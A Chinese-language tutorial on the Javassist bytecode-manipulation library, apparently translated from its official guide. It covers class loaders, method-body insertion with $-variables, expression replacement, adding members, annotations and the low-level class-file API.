例如，javassist.Loader可用于使用javassist修改的指定的类： 123456789ClassPool pool = ClassPool.getDefault();// 使用ClassPool创建LoaderLoader cl = new Loader(pool);CtClass ct = pool.get(\"org.byron4j.cookbook.javaagent.Rectangle\");ct.setSuperclass(pool.get(\"org.byron4j.cookbook.javaagent.Point\"));Class&lt;?&gt; c = cl.loadClass(\"org.byron4j.cookbook.javaagent.Rectangle\");Object o = c.newInstance(); 这个程序修改了类Rectangle类，将其父类设置为Point类，然后程序加载了修改后的Rectangle类，并且创建了一个实例。 如果用户想在加载一个类的时候按需修改它，则用户可以添加一个javassist.Loader的事件监听器。当这个类加载器加载一个类的时候就会通知添加好的事件监听器。 事件监听器必须实现以下两个接口： 1234public interface Translator &#123; public void start(ClassPool pool) public void onLoad(ClassPool pool, String classname)&#125; 当javassist.Loader中的addTranslator()将这个事件监听器添加到javassist.Loader对象中时，start()方法被调用。 方法onLoad()在javassist.Loader加载一个类之前被调用。onLoad()可以修改加载类的定义。 1234567891011121314151617181920212223242526/*** Loader的观察者*/public interface Translator &#123; /** * 当对象附加到加载器对象时，加载器将调用该对象进行初始化。此方法可用于获取(用于缓存)一些将在Translator的onLoad()中访问的CtClass对象。 * @param pool * @throws NotFoundException * @throws CannotCompileException */ void start(ClassPool pool) throws NotFoundException, CannotCompileException; /** * 当Loader加载一个类时，就会通知调用该方法。Loader会在onLoad()方法返回后调用 * pool.get(classname).toBytecode() * 方法去读取class文件，classname可能是尚未创建的类的名称。 * 如果这样的话，&lt;code&gt;onLoad()&lt;/code&gt;方法必须创建那个class，以便Loader可以在&lt;code&gt;onLoad()&lt;/code&gt;方法返回后读取它。 * @param pool * @param classname * @throws NotFoundException * @throws CannotCompileException */ void onLoad(ClassPool pool, String classname) throws NotFoundException, CannotCompileException;&#125; 当javassist.Loader对象的addTranslator()方法添加事件监听器的时候，start()方法就会被调用。 onLoad()方法会在javassist.Loader加载一个类之前被调用。 以下是这两种情况的源码： 12345678910111213141516171819// 添加事件监听器的时候，就会调用监听器的start方法public void addTranslator(ClassPool cp, Translator t) throws NotFoundException, CannotCompileException &#123; source = cp; translator = t; t.start(cp);//&lt;---&#125;// 存在监听器，则在Loader的findClass方法中，先执行监听器的onLoad()方法，再通过.get(name).toBytecode()加载类if (source != null) &#123; if (translator != null) translator.onLoad(source, name);//1 try &#123; classfile = source.get(name).toBytecode();//2 &#125; catch (NotFoundException e) &#123; return null; &#125;&#125; 所以，translator.onLoad的方法中可以修改加载的类的定义。 例如，下面的事件监听器在加载之前将所有的类改为公共类。 12345678910public class MyTranslator implements Translator &#123; void start(ClassPool pool) throws NotFoundException, CannotCompileException &#123;&#125; void onLoad(ClassPool pool, String classname) throws NotFoundException, CannotCompileException &#123; CtClass cc = pool.get(classname); cc.setModifiers(Modifier.PUBLIC); &#125;&#125; 请注意，onLoad()不必调用toBytecode()或writeFile()，因为javassist.Loader调用这些方法来获取类文件。 要运行一个带有MyTranslator对象的应用程序类MyApp，需要写一个主类，如下所示： 12345678910111213141516171819202122import javassist.*;public class Point &#123; public static void main(String[] args)&#123; System.out.println(\"com.sec.Point#main invoked!\"); &#125;&#125;public class Main2 &#123; public static void main(String[] args) throws Throwable &#123; Translator t = new MyTranslator(); ClassPool pool = ClassPool.getDefault(); Loader cl = new Loader(); cl.addTranslator(pool, t); // cl.run方法会运行指定MyApp的main方法 cl.run(\"com.sec.Point\", args); &#125;&#125;% java Main2 arg1 arg2 注意：应用的类像Point是不能访问加载器的类如MyTranslator、ClassPool的，因为它们是被不同的加载器加载的。应用的类是由javassist.Loader加载，而其他的是由默认的JVM类加载器加载的。 javassist.Loader加载类的顺序和java.lang.ClassLoader不同。 ClassLoader首先将加载操作委托给父加载器，如果父加载器找不到它们才由自身尝试加载类。 反过来说，javassist.Loader在委托给父加载器之前尝试加载类。只有在以下情况才去委托父加载器： 类不是由ClassPool.get()找到的 类使用了delegateLoadingOf()去指定由父加载器加载。 这个搜索顺序允许Javassist加载修改过的类。然而，如果加载失败的话就会委托给父加载器去加载。一旦一个类由其父加载器加载了，这个类引用的其它类也会由其父加载器加载，则这些类就不会被当前类加载器修改了。 回想一下，类C中所有引用的类都是由类C的真实加载器负责加载的。如果你的程序不能加载一个修改过的类，你应该确保所有使用该类的类都已经被javassist.Loader加载了。 编写一个类加载器一个使用Javassist的简单类加载器如下，继承ClassLoader。 12345678910111213141516171819202122232425262728293031import javassist.*;public class SampleLoader extends ClassLoader &#123; private ClassPool pool; public SampleLoader() throws NotFoundException &#123; this.pool = ClassPool.getDefault(); this.pool.insertClassPath(\"./target/classes\"); &#125; @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; CtClass cc; try&#123; cc = pool.get(name); //TODO byte[] bb = cc.toBytecode(); return defineClass(name,bb,0,bb.length); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return null; &#125; public static void main(String[] args) throws Exception &#123; SampleLoader sl = new SampleLoader(); Class&lt;?&gt; cl = sl.loadClass(\"com.sec.Point\"); cl.getDeclaredMethod(\"main\",new Class[]&#123;String[].class&#125;).invoke(null,new Object[]&#123;args&#125;); &#125;&#125; 假设Point是一个应用程序，为了执行这个程序，首先指定./target/classes为class文件目录。构造器中insertClassPath()方法指定了目录名称./target/classes，你可以使用不同的目录名称来代替你想要加载的类路径地址。 执行该程序，类加载器会加载Point类(Point.class文件)并且调用其main方法。 这是使用javassist最简单的示例。然而，如果你想编写一个更加复杂的类加载器，你需要了解更多的java类加载的机制。例如，上面的程序将Point类在命名空间与SampleLoader命名空间分开了，因为这两个是由不同的类加载器加载的。因此，Point类不能直接访问SampleLoader类。 修改一个系统类java.lang.String等系统类不能被系统类加载器以外的类加载器加载。因此，上图所示的SampleLoader或javassist.Loader不能在加载时修改系统类。 如果你的应用想那样去做的话（修改系统类），必须静态地修改系统类。 例如，添加一个新的属性字段给java.lang.String: 123456789// 添加字段给系统类：java.lang.StringClassPool pool = ClassPool.getDefault();CtClass ctClass = pool.get(\"java.lang.String\");// 创建字段CtField cf = new CtField(CtClass.intType, \"hiddenValue\", ctClass);cf.setModifiers(Modifier.PUBLIC);//添加字段ctClass.addField(cf);ctClass.writeFile(\".\"); 这个程序产生一个文件”./java/lang/String.class”。 % java -Xbootclasspath/p:. MyApp arg1 arg2... 在运行时重新加载一个类如果启动JVM时启动了JPDA，则一个类可以重加载。在JVM加载一个类后，旧的版本的类的定义可以卸载，新的版本可以重新加载。 换言之，类的定义可以在运行时动态修改。然而，一个新的类的定义必须与旧的类定义在某种程度上兼容。 JVM不允许两个版本之间更改模式。 它们拥有相同的方法、成员变量。 Javassist提供了一个方便的类，用于在运行时重载一个类。更多信息，请参见 javassist.tools.HotSwapper 的 API 文档。 自省 &amp; 定制化CtClass提供了自省的一些方法。Javassist的内省功能和Java反射API的内省功能兼容。 CtClass提供了getName()、getSuperclass()、getMethods()等等方法。CtClass也提供了修改类定义的方法，允许添加一个新的成员变量、构造器、方法，也可以检测方法体。 方法由CtMethod对象表示。CtMethod提供了修改方法定义的几个方法。注意：如果一个方法继承了某个类，则CtMethod表示为是在父类中声明的方法。一个CtMethod对象对应一个方法声明。 例如，如果类Point声明了一个方法move()，而Point类的的一个子类ColorPoint没有覆盖move()方法，这两个move()方法即Point中声名的和ColorPoint中继承的都由相同的CtMethod对象表示。如果修改这个CtMethod对象标表示的方法的定义，则修改会表现到这两个方法上。如果你仅仅想修改ColorPoint中的该方法，你首先必须给ColorPoint添加一个表示move()方法的CtMethod的副本，可以通过CtNewMethod.copy()方法获得。 Javassist不允许移除一个方法或者成员变量，但是允许变更方法名。所以如果一个方法不再需要了，应该重命名并且修改为私有的：调用CtMethod中的setName()和setModifiers()方法。 Javassist不允许在一个已存在的方法中添加额外的参数，为了处理这样的变更，接受额外参数或者其他参数的新方法应该添加在同一个类中。例如，如果你想在一个方法中添加一个额外的参数： 1void move(int newX, int newY) &#123; x = newX; y = newY; &#125; 改成: 1234void move(int newX, int newY, int newZ) &#123; // do what you want with newZ. move(newX, newY); &#125; Javassist 也提供了更低层次的API可以直接编辑原生class文件。例如,CtClass的getClassFile()返回一个ClassFile对象表示一个原生class文件。 CtMethod中的getMethodInfo()方法返回一个MethodInfo对象表示在class文件中的一个method_info结构。 低层次的API使用了来自JVM规范的词汇。用户必须了解class文件和字节码。更多的细节，可以参考javassist.bytecode包。 如果需要被修改的类包含以下以$开头的特殊标识符，则在运行时需要javassist.runtime包来支持。 在方法体的前部、后部插入代码CtMethod和CtConstructor提供了insertBefore(),insertAfter()和addCatch()方法。他们都是在已存在的方法体中插入代码段，用户可以使用Java中的源代码文本方式编写代码段。Javassist包含一个简单的Java编译器用于处理源文本，接收Java中的源文本并编译成字节码到方法体中。 插入代码段在指定行也是可以的（如果行号表在class文件中的话），CtMethod和CtConstructor的insertAt()方法在源class文件中获取源文本和行号，它将编译源文本并且在指定行插入编译过的代码。 语句和代码块可以指的是字段和方法。特殊变量$0，$1，$2，…来访问方法参数。虽然允许在块中声明一个新的局部变量，但不允许访问方法中声明的局部变量。然而，insertAt()允许语句和代码块访问局部变量，如果这些变量在指定的行号处可用，并且目标方法是用-g选项编译的。 传递给方法insertBefore()、insertAfter()、addCatch()和insertAt()的String对象是由Javassist中包含的编译器编译的。由于编译器支持语言扩展，所以几个以$开头的标识符具有特殊的意义。 符号 含义 $0, $1, $2, … this and 方法的参数 $args 方法参数数组.它的类型为 Object[] $$ 所有实参。例如, m($$) 等价于 m($1,$2,…) $cflow(…) cflow 变量 $r 返回结果的类型，用于强制类型转换 $w 包装器类型，用于强制类型转换 $_ 返回值 $sig 类型为 java.lang.Class 的参数类型数组 $type 一个 java.lang.Class 对象，表示返回值类型 $class 一个 java.lang.Class 对象，表示当前正在修改的类 $0,$1,$2传递给目标方法的参数可以用$1，$2，…代替原来的参数名进行访问。1元代表第一个参数，2元代表第二个参数，以此类推。这些变量的类型与参数类型相同。$0相当于这样。如果方法是静态的，则$0不可用。 这些变量的用法如下。假设一个类Point: 1234class Point &#123; int x, y; void move(int dx, int dy) &#123; x += dx; y += dy; &#125;&#125; 要在调用move()方法时打印dx和dy的值，请执行这个程序： 12345ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.get(\"Point\"); CtMethod m = cc.getDeclaredMethod(\"move\"); m.insertBefore(\"&#123; System.out.println($1); System.out.println($2); &#125;\"); cc.writeFile(); 修改后的Point类的定义是这样的。 12345678910class Point &#123; int x, y; void move(int dx, int dy) &#123; &#123; System.out.println(dx); System.out.println(dy); &#125; x += dx; y += dy; &#125;&#125; $1和$2分别由dx和dy代替。 $1, $2, $3 …是可以更新的。如果变量值更改了，那么参数的值也会更新。 $args变量$args表示装载所有参数的参数数组。该变量的类型是一个Object类的数组。如果一个参数类型是一个基本类型，比如int，那么参数值就会被转换为一个包装对象，比如java.lang.Integer来存储在$args中。因此，$args[0]相当于$1，除非第一个参数的类型是一个基本类型。请注意，$args[0]并不等同于​$0，$0代表了this。 如果一个Object数组被分配给$args，那么该数组的每个元素都被分配给每个参数。如果一个参数类型是基本类型，那么对应元素的类型必须是封装类型。在将值分配给参数之前，会将其从封装类型转换为基本类型。 $$变量 $$ 是所有参数列表的缩写，用逗号分隔。 例如，如果方法 move() 的有 3 个参数，则 12move($$) == move($1, $2, $3)exMove($$, context) == exMove($1, $2, $3, context) 如果move()不接受任何参数，那么move($$)相当于move()。 请注意，$$使方法调用的通用符号与参数数量相关。它通常与后面的$proceed一起使用。 $cflow$cflow的意思是 “控制流”。这个只读变量返回特定方法的递归调用深度。 假设下面所示的方法由CtMethod对象cm表示： 123456int fact(int n) &#123; if (n &lt;= 1) return n; else return n * fact(n - 1);&#125; 要使用$cflow，首先声明$cflow用于监控对方法fact()的调用。 12CtMethod cm = ...;cm.useCflow(\"fact\"); useCflow()的参数是声明的$cflow变量的标识符。任何有效的Java名称都可以作为标识符。由于标识符也可以包含.，例如，my.Test.fact就是一个有效的标识符。 那么，$cflow(fact)表示cm指定的方法的递归调用的深度。当方法第一次被调用时，$cflow(fact)的值是0，而当方法内部被递归调用时，它的值是1。例如 12cm.insertBefore(\"if ($cflow(fact) == 0)\" + \" System.out.println(\\\"fact \\\" + $1);\"); 翻译方法fact()，以便它显示参数。因为检查了 $cflow(fact) 的值，所以如果在 fact() 中递归调用，则方法 fact() 不会显示参数。 $cflow的值是当前线程当前最上面的栈帧下与指定方法cm相关联的栈帧数。在与指定方法cm不同的方法中也可以访问$cflow。 $r$r 表示方法的结果类型（返回类型）。它用在 cast 表达式中作 cast 转换类型。 下面是一个典型的用法： 12Object result = ... ;$_ = ($r)result; 如果结果类型是一个基元类型，那么($r)遵循特殊的语义。首先，如果抛出表达式的操作数类型是基本类型，($r)就会作为一个普通的抛出操作数对结果类型进行操作。 另一方面，如果操作数类型是封装类型，($r)就会从封装类型转换到结果类型。例如，如果结果类型是int，那么($r)从java.lang.Integer转换为int。 如果结果类型是void，那么($r)不转换类型，它什么也不做。然而，如果操作数是对void方法的调用，那么($r)的结果是null。例如，如果结果类型是void，而foo()是一个void方法，则 1$_ = ($r)foo(); $w$w代表一个封装类型。它必须在一个cast表达式中作为cast转换类型使用。($w)从一个基本类型转换到相应的封装类型。下面的代码是一个例子。 1Integer i = ($w)5; 选择的封装类型取决于 ($w) 后面的表达式类型。如果表达式的类型是double，那么包装器类型就是java.lang.Double.。 如果($w)后面的表达式类型不是基本类型，那么($w)什么都不做。 $_CtMethod和CtConstructor中的insertAfter()将编译后的代码插入到方法的最后。在给insertAfter()的语句中，不仅有上面所示的变量如$0,$1，还可以有$_。 变量$_表示方法的结果值。该变量的类型就是该方法的结果类型（返回类型）。如果结果类型是void，那么$_的类型是Object，$_的值是null。 虽然由insertAfter()插入的编译代码是在控件从方法中正常返回之前执行的，但它也可以在方法抛出异常时执行。为了在发生异常时执行它，insertAfter()的第二个参数asFinally必须为true。 如果抛出异常，由insertAfter()插入的编译代码将作为最后子句执行。在编译后的代码中，$_的值为0或空。在编译代码执行终止后，原来抛出的异常会重新抛给调用者。注意，$_的值永远不会被抛给调用者，而是被丢弃。 $sig$sig的值是一个由java.lang.Class对象组成的数组，这些对象按照声明顺序表示形参类型。 $type$type的值是一个java.lang.Class对象，代表结果值的类型。如果这是一个构造函数，那么这个变量是指Void.class。 $class$class 的值是一个 java.lang.Class 对象，代表声明编辑的方法所在的类。这代表了$0的类型。 addCatchaddCatch()插入方法体抛出异常时执行的代码，控制权会返回给调用者。 在插入的源代码中，异常用 $e 表示。 123CtMethod m = ...;CtClass etype = ClassPool.getDefault().get(\"java.io.IOException\");m.addCatch(\"&#123; System.out.println($e); throw $e; &#125;\", etype); 转换成对应的 java 代码如下： 123456try &#123; // the original method body&#125; catch (java.io.IOException e) &#123; System.out.println(e); throw e;&#125; 请注意，插入的代码片段必须以 throw 或 return 语句结束。 修改方法体CtMethod 和 CtConstructor 提供 setBody() 来替换整个方法体。它将新的源代码编译成 Java 字节码，并用它替换原方法体。 如果给定的源文本为 null，则替换后的方法体仅包含return语句，除非结果类型为 void，否则返回零或空值。 在传递给 setBody() 的源代码中，以 $ 开头的标识符具有特殊含义： 符号 含义 $0, $1, $2, … this and 方法的参数 $args 方法参数数组.它的类型为 Object[] $$ 所有实参。例如, m($$) 等价于 m($1,$2,…) $cflow(…) cflow 变量 $r 返回结果的类型，用于强制类型转换 $w 包装器类型，用于强制类型转换 $sig 类型为 java.lang.Class 的参数类型数组 $type 一个 java.lang.Class 对象，表示返回值类型 $class 一个 java.lang.Class 对象，表示当前正在修改的类 $_不可用。 替换表达式Javassist 只允许修改方法体中包含的表达式。 javassist.expr.ExprEditor 是一个用于替换方法体中的表达式的类。用户可以定义 ExprEditor 的子类来指定修改表达式的方式。 要运行 ExprEditor 对象，用户必须在 CtMethod 或 CtClass 中调用 instrument()。 例如： 123456789CtMethod cm = ... ;cm.instrument( new ExprEditor() &#123; public void edit(MethodCall m) throws CannotCompileException &#123; if (m.getClassName().equals(\"Point\") &amp;&amp; m.getMethodName().equals(\"move\")) m.replace(\"&#123; $1 = 0; $_ = $proceed($$); &#125;\"); &#125; &#125;); 上述代码，搜索由 cm 表示的方法体，并用使用下面的代码替换 Point 中的 move()调用： 1&#123; $1 = 0; $_ = $proceed($$); &#125; 因此 move() 的第一个参数总是0。注意，替换的代码不是一个表达式，而是一个语句或块。 它不能是或包含 try-catch 语句。 方法 instrument()搜索一个方法体。如果它找到了一个表达式，如方法调用、字段访问和对象创建，那么它就在给定的ExprEditor对象上调用edit()。edit()的参数是一个代表找到的表达式的对象。edit()方法可以通过该对象检查和替换该表达式。 在edit()的参数上调用replace()，可以将给定的语句或块替换为表达式。如果给定的块是空块，也就是说，如果执行了replace(“{}”)，那么表达式就会从方法体中删除。如果你想在表达式之前/之后插入一条语句（或一个代码块），应该向 replace()传递一个类似下面的代码块，无论表达式是方法调用、字段访问、对象创建，还是其他： 123&#123; *before-statements;* $_ = $proceed($$); *after-statements;* &#125; 当是write access写访问： $_ = $proceed(); 当是read access读访问： $proceed($$); javassist.expr.MethodCall一个MethodCall对象代表一个方法调用。MethodCall中的方法replace()为方法调用替换了一条语句或一个代码块。它接收代表被替换的语句或代码块的源文本，其中以$开头的标识符具有特殊意义，就像传递给insertBefore()的源文本一样。 符号 含义 $0 方法调用的目标对象。它不等于 this，它代表了调用者。 如果方法是静态的，则 $0 为 null $1, $2 .. 方法的参数 $_ 方法调用的结果 $r 返回结果的类型，用于强制类型转换 $class 一个 java.lang.Class 对象，表示当前正在修改的类 $sig 类型为 java.lang.Class 的参数类型数组 $type 一个 java.lang.Class 对象，表示返回值类型 $class 一个 java.lang.Class 对象，表示当前正在修改的类 $proceed 调用表达式中方法的名称 这里的方法调用意味着由 MethodCall 对象表示的方法。 其他标识符如 $w，$args 和 $$ 也可用。 除非方法调用的返回类型为 void，否则返回值必须在源代码中赋给 $_ ，$_的类型是表达式的结果类型。如果结果类型为 void，那么 $_ 的值将被忽略。 $proceed 不是字符串值，而是特殊的语法。 它后面必须跟一个由括号括起来的参数列表。 javassist.expr.ConstructorCallConstructorCall 表示构造函数调用，例如包含在构造函数中的 this() 和 super()。ConstructorCall 中的方法 replace() 可以使用语句或代码块来代替构造函数。它接收表示替换语句或块的源代码。和 insertBefore() 方法一样，传递给 replace 的源代码中，以 $ 开头的标识符具有特殊的含义。 符号 含义 $0 构造调用的目标对象。它等于 this $1, $2, … 构造函数的参数 $class 一个 java.lang.Class 对象，表示当前正在修改的类 $sig 类型为 java.lang.Class 的参数类型数组 $proceed 调用表达式中构造函数的名称 其他标识符如 $w，$args 和 $$ 也可用。 由于任何构造函数必须调用超类的构造函数或同一类的另一个构造函数，所以替换语句必须包含构造函数调用，通常是对 $proceed() 的调用。 $proceed 不是字符串值，而是特殊的语法。 它后面必须跟一个由括号括起来的参数列表。 javassist.expr.FieldAccessFieldAccess 对象表示字段访问。 如果找到对应的字段访问操作，ExprEditor 中的 edit() 方法将接收到一个 FieldAccess 对象。FieldAccess 中的 replace() 方法接收替源代码来替换字段访问。 javassist.expr.NewExprNewExpr 表示使用 new 运算符（不包括数组创建）创建对象的表达式。 如果发现创建对象的操作，NewEditor 中的 edit() 方法将接收到一个 NewExpr 对象。NewExpr 中的 replace() 方法接收替源代码来替换字段访问。 javassist.expr.NewArrayNewArray 表示使用 new 运算符创建数组。如果发现数组创建的操作，ExprEditor 中的 edit() 方法一个 NewArray 对象。NewArray 中的 replace() 方法可以使用源代码来替换数组创建操作。 javassist.expr.Instanceof一个 InstanceOf 对象表示一个 instanceof 表达式。 如果找到 instanceof 表达式，则ExprEditor 中的 edit() 方法接收此对象。Instanceof 中的 replace() 方法可以使用源代码来替换 instanceof 表达式。 javassist.expr.CastCast 表示 cast 表达式。如果找到 cast 表达式，ExprEditor 中的 edit() 方法会接收到一个 Cast 对象。 Cast 的 replace() 方法可以接收源代码来替换替换 cast 表达式。 javassist.expr.HandlerHandler 对象表示 try-catch 语句的 catch 子句。 如果找到 catch，ExprEditor 中的 edit() 方法会接收此对象。 Handler 中的 insertBefore() 方法会将收到的源代码插入到 catch 子句的开头。 添加新方法和字段添加新方法Javassist 可以创建新的方法和构造函数。CtNewMethod 和 CtNewConstructor 提供了几个工厂方法来创建 CtMethod 或 CtConstructor 对象。make() 方法可以通过源代码来CtMethod 或 CtConstructor 对象。 例如： 123CtClass point = ClassPool.getDefault().get(\"Point\");CtMethod m = CtNewMethod.make(\"public int xmove(int dx) &#123; x += dx; &#125;\",point);point.addMethod(m); 上面的代码向类 Point 添加了一个公共方法 xmove()。在这个例子中，x 是类 Point 的一个int 字段。 传递给 make() 和 setBody() 的源文本可以包括以$开头的标识符（除了$_）。 如果目标对象和目标方法名也被传递给 make() 方法，源文本中也可以包括 $proceed。 例如： 1234CtClass point = ClassPool.getDefault().get(\"Point\");CtMethod m = CtNewMethod.make(\"public int ymove(int dy) &#123; $proceed(0, dy); &#125;\", point, \"this\", \"move\");point.addMethod(m); 这个程序创建一个 ymove() 方法，定义如下： 1public int ymove(int dy) &#123; this.move(0, dy); &#125; 注意，$proceed 已经被替换为 this.move。 Javassist 还提供了另一种添加新方法的方式。 你可以先创建一个抽象方法，然后给它一个方法体： 12345CtClass cc = ... ;CtMethod m = new CtMethod(CtClass.intType, \"move\",new CtClass[] &#123; CtClass.intType &#125;, cc);cc.addMethod(m);m.setBody(\"&#123; x += $1; &#125;\");cc.setModifiers(cc.getModifiers() &amp; ~Modifier.ABSTRACT); 因为 Javassist 在类中添加了的方法是抽象的，所以在调用 setBody() 之后，必须将类显式地改回非抽象类（拥有方法体）。 相互递归的方法如果一个方法调用了另一个没有被添加到类中的方法，Javassist就不能编译该方法。 (但是Javassist 可以编译一个以递归方式调用自己的方法。) 要将相互递归的方法添加到一个类中，你需要一个如下所示的技巧。假设你想把方法m()和n()添加到一个由cc表示的类中。 12345678CtClass cc = ... ;CtMethod m = CtNewMethod.make(\"public abstract int m(int i);\", cc);CtMethod n = CtNewMethod.make(\"public abstract int n(int i);\", cc);cc.addMethod(m);cc.addMethod(n);m.setBody(\"&#123; return ($1 &lt;= 0) ? 1 : (n($1 - 1) * $1); &#125;\");n.setBody(\"&#123; return m($1); &#125;\");cc.setModifiers(cc.getModifiers() &amp; ~Modifier.ABSTRACT); 你必须先创建两个抽象方法，并将它们添加到类中。然后设置它们的方法体，即使方法体包括互相递归的调用。 最后，必须将类更改为非抽象类。 添加一个字段Javassist 还允许用户创建一个新字段。 123CtClass point = ClassPool.getDefault().get(\"Point\");CtField f = new CtField(CtClass.intType, \"z\", point);//int z;point.addField(f); 该程序向类 Point 添加一个名为 z 的字段。 int z;如果必须指定添加字段的初始值，那么上面的程序必须修改为： 123CtClass point = ClassPool.getDefault().get(\"Point\");CtField f = new CtField(CtClass.intType, \"z\", point);point.addField(f, \"0\"); // initial value is 0 总结：先声明再初始化。 现在，方法 addField() 接收两个参数，第二个参数表示计算初始值的表达式。这个表达式可以是任意 Java 表达式，只要其结果与字段的类型匹配。 请注意，表达式不以分号结尾。 此外，上述代码可以重写为更简单代码： 123CtClass point = ClassPool.getDefault().get(\"Point\");CtField f = CtField.make(\"public int z = 0;\", point);point.addField(f); 删除成员要删除字段或方法，请在 CtClass 的 removeField() 或 removeMethod() 方法。 一个CtConstructor 可以通过 CtClass 的 removeConstructor() 删除。 注解CtClass，CtMethod，CtField 和 CtConstructor 提供 getAnnotations() 方法，用于读取注解。 它返回一个注解类型的对象。 例如，假设有以下注解： 1234public @interface Author &#123; String name(); int year();&#125; 下面是使用注解的代码： 1234@Author(name=\"Chiba\", year=2005)public class Point &#123; int x, y;&#125; 然后，可以使用 getAnnotations() 获取注解的值。 它返回一个包含注解类型对象的数组。 123456CtClass cc = ClassPool.getDefault().get(\"Point\");Object[] all = cc.getAnnotations();Author a = (Author)all[0];String name = a.name();int year = a.year();System.out.println(\"name: \" + name + \", year: \" + year); 这段代码输出： 1name: Chiba, year: 2005 由于 Point 的注解只有 @Author，所以数组的长度是 1，all[0] 是一个 Author 对象。 注解成员值可以通过调用Author对象的 name() 和 year() 来获取。 要使用 getAnnotations()，注释类型（如 Author）必须包含在当前类路径中。它们也必须也可以从 ClassPool 对象访问。如果未找到注释类型的类文件，Javassist 将无法获取该注释类型的成员的默认值。 运行时支持类在大多数情况下，使用 Javassist 修改类不需要运行 Javassist。 但是，Javassist 编译器生成的某些字节码需要运行时支持类，这些类位于 javassist.runtime 包中（有关详细信息，请阅读该包的API文档）。请注意，javassist.runtime 是修改的类时唯一可能需要使用的包。 修改类的运行时不会再使用其他的 Javassist 类。 导入包源代码中的所有类名都必须是完整的（必须包含包名，java.lang 除外）。例如，Javassist 编译器可以解析 Object 以及 java.lang.Object。 要告诉编译器在解析类名时搜索其他包，请在 ClassPool中 调用 importPackage()。 例如， 12345ClassPool pool = ClassPool.getDefault();pool.importPackage(\"java.awt\");CtClass cc = pool.makeClass(\"Test\");CtField f = CtField.make(\"public Point p;\", cc);//识别为java.awt.Pointcc.addField(f); 第二行导入了 java.awt 包。 因此，第三行不会抛出异常。 编译器可以将 Point 识别为java.awt.Point。 importPackage() 不会影响 ClassPool 中的 get() 方法。只有编译器才考虑导入包。 get() 的参数必须是完整类名。 限制在目前实现中，Javassist 中包含的 Java 编译器有一些限制： J2SE 5.0 引入的新语法（包括枚举和泛型）不受支持。注释由 Javassist 的低级 API 支持。 参见 javassist.bytecode.annotation 包（以及 CtClass 和 CtBehavior 中的 getAnnotations()）。对泛型只提供部分支持。更多信息，请参阅后面的部分； 初始化数组时，只有一维数组可以用大括号加逗号分隔元素的形式初始化，多维数组还不支持； 编译器不能编译包含内部类和匿名类的源代码。 但是，Javassist 可以读取和修改内部/匿名类的类文件； 不支持带标记的 continue 和 break 语句； 编译器没有正确实现 Java 方法调度算法。编译器可能会混淆在类中定义的重载方法（方法名称相同，查参数列表不同）。例如： 12345678class A &#123;&#125; class B extends A &#123;&#125; class C extends B &#123;&#125; class X &#123; void foo(A a) &#123; .. &#125; void foo(B b) &#123; .. &#125; &#125; 如果编译的表达式是 x.foo(new C())，其中 x 是 X 的实例，编译器将产生对 foo(A) 的调用，尽管编译器可以正确地编译 foo((B) new C()) 。 建议使用 # 作为类名和静态方法或字段名之间的分隔符。 例如，在常规 Java 中： 1javassist.CtClass.intType.getName() 在 javassist.CtClass 中的静态字段 intType 指示的对象上调用一个方法 getName()。 在Javassist 中，用户也可以写上面的表达式，但是建议写成这样： 1javassist.CtClass#intType.getName() 可以使编译器可以快速解析表达式。 字节码级APIJavassist 还提供了用于直接编辑类文件的低级级 API。 使用此 API之前，你需要详细了解Java 字节码和类文件格式，因为它允许你对类文件进行任意修改。 如果你只想生成一个简单的类文件，使用javassist.bytecode.ClassFileWriter就足够了。 它比javassist.bytecode.ClassFile更快而且更小。 获取ClassFile对象javassist.bytecode.ClassFile 对象表示类文件。要获得这个对象，应该调用 CtClass 中的 getClassFile() 方法。你也可以直接从类文件构造 javassist.bytecode.ClassFile 对象。 例如： 123BufferedInputStream fin = new BufferedInputStream(new FileInputStream(\"Point.class\"));ClassFile cf = new ClassFile(new DataInputStream(fin)); 这代码段从 Point.class 创建一个 ClassFile 对象。 ClassFile 对象可以写回类文件。 ClassFile 的 write() 将类文件的内容写入给定的 DataOutputStream。 也可以从头开始创建一个类文件 12345ClassFile cf = new ClassFile(false, \"test.Foo\", null);cf.setInterfaces(new String[] &#123; \"java.lang.Cloneable\" &#125;); FieldInfo f = new FieldInfo(cf.getConstPool(), \"width\", \"I\"); f.setAccessFlags(AccessFlag.PUBLIC); cf.addField(f); cf.write(new DataOutputStream(new FileOutputStream(\"Foo.class\"))); 这段代码生成了一个类文件Foo.class，实现结果： 1234package test; class Foo implements Cloneable &#123; public int width; &#125; 添加和删除成员ClassFile 提供了 addField()，addMethod() 和 addAttribute()，来向类添加字段、方法和类文件属性。 注意，FieldInfo，MethodInfo 和 AttributeInfo 对象包含了一个指向 ConstPool（常量池表）对象的链接。 ConstPool 对象必须是 ClassFile 对象和添加到该 ClassFile 对象的 FieldInfo（或MethodInfo 等）对象的共同对象。 换句话说，一个FieldInfo（或MethodInfo等）对象不能在不同的ClassFile 对象之间共享。 要从 ClassFile 对象中删除字段或方法，必须首先获取包含该类的所有字段的 java.util.List 对象。 getFields() 和 getMethods() 会返回这些列表。可以通过调用List对象的 remove() 来删除字段或方法。可以以类似的方式删除属性。在 FieldInfo 或 MethodInfo 中调用 getAttributes() 以获取属性列表，并从列表中删除一个属性。 遍历方法体使用 CodeIterator 可以检查方法体中的每个字节码指令，要获得 CodeIterator 对象，参考以下代码： 1234ClassFile cf = ... ; MethodInfo minfo = cf.getMethod(\"move\"); // we assume move is not overloaded. CodeAttribute ca = minfo.getCodeAttribute(); CodeIterator i = ca.iterator(); CodeIterator 对象允许你逐个访问每个字节码指令。下面展示了一部分 CodeIterator 中声明的方法： void begin() 移动到第一条指令 void move(int index) 移动到指定位置的指令 boolean hasNext() 是否有下一条指令 int next() 返回下一条指令的索引。注意，它不返回下一条指令的操作码。 int byteAt（int index） 返回索引处的无符号8位整数。 int u16bitAt（int index） 返回索引处的无符号16位整数。 int write（byte [] code，int index） 在索引处写入字节数组。 void insert（int index，byte [] code） 在索引处插入字节数组。自动调整分支偏移量。 以下代码段打印了方法体中所有的指令： 123456CodeIterator ci = ... ;while (ci.hasNext()) &#123; int index = ci.next(); int op = ci.byteAt(index); System.out.println(Mnemonic.OPCODE[op]);&#125; 生成字节码序列Bytecode 对象表示字节码指令序列。它是一个可扩展，可增长的字节码数组。以下是示例代码段： 12345ConstPool cp = ...; // constant pool tableBytecode b = new Bytecode(cp, 1, 0);b.addIconst(3);b.addReturn(CtClass.intType);CodeAttribute ca = b.toCodeAttribute(); 